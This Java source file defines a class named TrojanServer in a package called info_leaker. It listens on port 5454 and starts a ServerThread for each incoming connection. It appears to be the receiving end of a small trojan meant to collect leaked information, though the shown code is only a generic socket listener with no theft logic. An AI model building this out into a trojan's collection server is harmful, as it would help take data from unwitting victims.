package com.info_leaker;

import java.io.IOException;
import java.net.ServerSocket;
import java.net.Socket;

public class TrojanServer {
	private int m_port;
	ServerSocket m_svrsct = null;	// socket of server
	Socket m_sct = null;			// socket accepted
	
	public TrojanServer(int p){
		m_port = p;
		try {
			m_svrsct = new ServerSocket(m_port, 100);
		} catch (IOException e) {
			System.out.println("Initialize Server Socket Error.");
			//e.printStackTrace();
		}
		System.out.println("Trojan Server now start.");
	}
	public void listen(){
		try {
			while(true){
				// accept a socket from client
				m_sct = m_svrsct.accept();
				// block here
				ServerThread st = new ServerThread(m_sct);
				new Thread(st).start();
			}
		} catch (IOException e) {
			System.out.println("Server Closed.");;
		}
	}
	
	public static void main(String[] args){
		TrojanServer tserver = new TrojanServer(5454);
		tserver.listen();
	}
	
}
